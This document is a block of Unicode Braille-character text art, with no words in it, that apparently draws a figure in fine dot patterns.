	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢶⣿⢃⣠⣴⣶⣶⣿⣛⢯⣹⣾⠁⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣻⣾⣿⣞⣯⣷⣽⣾⣿⣁⣀⣠⢤⡶⣶⠿⣻⣶⣟⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣟⣯⣿⣶⣯⣿⣿⣿⡁⠀⣴⠿⣟⣿⣟⣿⣻⢷⢯⣞⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢈⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⢒⣖⣲⡶⢶⡖⣶⣒⢶⡲⣞⣫⠭⣭⣭⣽⣭⣯⣽⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⠿⠿⠿⣌⠿⢿⣿⣿⣿⣿⡾⣽⢯⣟⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠘⡀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣯⣛⢧⣛⢧⣛⡶⣹⣎⢷⣝⡮⣟⢷⡾⣹⢯⡟⠉⠉⠛⢿⣿⣿⣯⣟⣿⣫⣽⡿⣃⣔⣬⣿⣷⣯⣿⣿⣿⣿⣽⣻⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣟⡾⣭⡟⣾⣹⢗⣾⣫⢾⡽⣽⢾⡽⢯⡟⠀⠀⠀⢀⢈⣿⣿⣿⣿⣿⠿⢻⣷⣼⣿⣿⣟⣿⣟⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠐⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣿⣷⣯⣟⡾⣽⣳⢿⡽⣾⡽⡟⠀⠀⢀⣰⠞⠟⠙⢻⣷⣿⣸⣷⣾⣟⣺⣽⣟⣻⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣯⣿⣽⣳⢿⠃⠀⠀⢀⠀⢠⣤⣦⣄⣇⠉⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣉⠉⠉⠻⠀⠀⠠⢀⣾⢿⠋⢁⣿⣿⠀⠀⠀⠀⣿⣧⠙⢿⣹⣏⢠⣛⠟⠁⠀⠀⢀⣴⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣓⣈⣰⣦⣤⣀⣼⠋⠀⠀⢭⣽⣿⡇⠀⣀⣀⣿⣿⡇⡸⣿⣿⡤⠉⠒⠤⣀⠀⠠⡄⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⠏⠀⠛⣞⣧⣾⠍⠢⣀⠀⠈⠻⠟⣇⢉⣡⡶⣭⠯⡀⠐⠛⠙⢇⠀⠐⢲⠏⠀⠀⠈⠲⠞⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠁⢀⠄⠂⢸⠛⠁⣠⣲⡆⢔⠾⠋⠀⠈⠢⣉⠀⢀⣀⣈⡆⠀⠀⢸⣀⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠤⣌⡁⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠀⠀⣜⣩⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⣛⡉⠀⠀⠓⢄⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⡹⠋⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠐⠒⠚⣿⣶⠦⣄⣀⡀⠘⠿⠽⠶⢾⣷⣀⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣀⡀⣀⣀⣠⡿⠍⣛⠻⡿⠿⣟⣲⣶⣶⡶⠿⣿⣖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⠛⢻⠿⠻⢿⣿⣷⣿⣶⣆⠬⡯⣑⣿⣿⣿⣿⣹⣍⣧⣾⠈⠉⠉⠒⠒⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⢠⠁⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠐⠒⠠⣔⠁⠀⠉⣿⣿⣿⢛⡖⠾⠿⢿⡿⠿⣾⠟⠁⠀⠀⠀⠀⠀⠸⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡅⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⠘⢿⣿⠇⠈⠁⠒⠺⣤⣢⡼⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠣⡀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠹⡄⠐⠒⠠⠤⠀⣀⠀⠀⠀⠀⠈⣏⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠑⣄⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⠘⣆⠀⠀⠀⠀⠀⠉⠑⠢⡀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⠈⢣⡀⠠⢄⣀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠧⣀⣀⠀⢀⡤⠋⠀⠀⠀⠀⠈⢁⠒⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⢀⣠⢾⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠆⠈⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⣻⡿⠏⠀⠀⠀⠐⠢⠄⢀⡀⣰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡷⠖⠋⣁⡼⣇⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⡀⢀⡎⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡔⠍⠀⠀⠈⠢⣀⠀⠀⠀⡰⢠⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⡴⠋⠁⠁⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢧⠄⠂⡄⠀⠀⠀⠀⠁⠢⢴⣁⡼⠀⠀⠀⠈⠑⠂⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⣀⠤⠖⠉⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⢠⠀⠀⠀⠑⠤⡀⠀⠀⡐⠁⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠈⢆⠀⠀⠀⠀⠀⢑⠞⠤⣠⣇⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡠⠤⢤⢤⠴⠃⠀⡀⠔⠊⠀⠠⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⠀⠀⠀⠣⡀⠀⠀⡤⠃⠠⣼⠃⢳⠈⠉⠉⣍⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⡜⢸⢀⡔⠉⠀⢀⡠⢔⠊⠉⠻⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡦⡀⠀⠀⠈⠑⠺⠤⣴⠟⠃⠀⠸⡆⠐⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⢀⠃⢸⡃⣇⠀⡰⠟⠂⠁⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠀⠀⠀⠈⠺⠦⣄⣠⠤⠴⠊⠉⠀⠀⠀⡼⠁⠀⠐⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀⠀⠀⢸⠀⢸⣇⠞⠉⠀⠀⠀⠀⢀⡠⠐⠀⠈⢣⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢿⣁⠀⠈⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠀⠀⠰⠀⢸⠹⡄⠀⠀⢀⡠⠒⠁⠀⠀⠀⡠⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢜⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⠈⠉⠓⠦⠄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡯⠀⠀⠀⣆⣼⡆⢙⣤⡐⠁⠀⠀⠀⡠⠔⠉⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢂⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢾⠁⠉⠢⢄⡀⠀⠀⠀⠀⠈⠉⠁⠐⠒⠒⠒⠒⠒⠚⠓⠀⠈⠉⠀⠀⢧⠀⠘⢷⣀⡠⠔⠉⠀⠀⠀⠀⢀⠠⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⡱⠁⠀⠀⠀⠀⠈⠁⠒⠠⠤⢀⣀⣀⢀⠀⡀⢀⢀⡀⠀⠀⣀⡠⠔⠒⠂⠙⣆⠀⠀⠙⣦⠀⠀⠀⢀⠄⠊⠁⠀⠀⡀⠘⣄⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⢡⠊⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠰⡄⠀⠹⡄⠀⠀⠀⠳⡄⠐⠁⠀⠀⢀⠔⠉⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⡔⠁⠀⠀⠀⠀⠀⠀⠀⣰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠹⡄⠀⠀⠀⠈⢷⣀⡠⠚⠁⠀⠀⢀⠄⠢⡀⠣⣀⠀⠀⠀⢀⣀⣤⣤⣄⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⢁⠎⠀⠀⠀⠀⠀⠀⠀⠀⢰⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⣹⡄⠀⠀⠀⠀⠀⠀⠀⡇⡆⠀⠀⢳⠀⠀⠀⠀⠈⠙⢵⠀⠀⢀⠕⢁⠖⡠⠁⠀⠉⡖⠚⠉⠩⢿⡟⣿⣭⣷⣄⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⡘⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢡⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⡎⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⢣⠀⠀⠀⠀⠀⠀⠀⢹⠸⡀⠀⠐⢇⠀⠀⠀⠀⠀⠀⠑⢶⡁⠀⢸⡔⠁⠀⢠⠃⢁⠀⠀⠀⠒⣿⡽⣶⢾⣿⣷⣄⠀
	⠀⠀⠀⠀⠀⠀⢰⠇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢣⠇⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸⢠⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠸⠀⡇⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠘⢿⣦⣾⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⢸⣿⣷⣿⡿⣿⣿⣧
	⠀⠀⠀⠀⠀⠀⢎⠀⠀⠀⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⡌⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⡇⠀⠀⠄⠀⠀⠀⠀⡇⢸⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠹⣴⠀⠀⡜⠀⠀⢘⣲⣄⣀⣈⣸⠿⢿⣯⣿⣽⣞⣿
	⠀⠀⠀⠀⠀⠀⠀⢣⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⡸⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡸⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⡇⠀⠀⠀⠀⠀⠀⠀⢸⠈⡇⠀⠀⠈⢇⠀⠀⠀⠀⠀⠀⠀⠀⠸⠓⣜⠂⠀⣴⣿⣿⣷⣾⣯⣿⣦⠈⠉⠛⠻⠞⠉
	⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⡇⢜⡀⠤⣀⠀⠀⠀⠀⠀⠀⠀⡇⢓⠨⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣇⠀⠀⠀⠀⠀⠀⠀⠈⡆⢥⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠨⠀⠀⠓⢦⢿⣿⣿⣾⣷⣿⣿⡿⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠈⠑⠀⠦⠤⠄⠀⠀⠀⠀⣇⣽⠀⠀⠄⠀⠀⠀⠀⠀⠀⠒⠈⢸⠂⡏⠀⠠⠀⠀⠀⠀⠐⠀⠇⢸⠄⣀⣀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⣶⠤⠤⠤⠤⠤⠶⠖⠛⠉⠲⠤⣄⣀⣀⣀⢀⣀⣀⣤⣤⣼⣿⣧⣈⠉⠐⠒⠂⠀⠀⠀⢸⡻⠦⠤⣤⠤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡀⠀⢠⣀⣤⠴⠖⠛⠋⠉⠉⠉⣩⡥⠬⠥⣬⣉⣹⡏⠉⠉⠉⠉⠉⠉⠒⠒⠒⠚⠿⠥⢤⣀⡀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⡗⠚⠉⣀⠠⠤⠒⠒⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⠉⠁⠉⠁⠀⠀⠀⠒⠤⢩⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠉⡄⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠠⡟⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠘⡄⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢸⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⢨⡇⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⢈⡰⢯⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠋⠀⢀⣸⣄⠇⠈⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⢸⢧⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⠔⠁⠊⠁⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⣠⠋⠀⠀⠀⠀⠀⠀
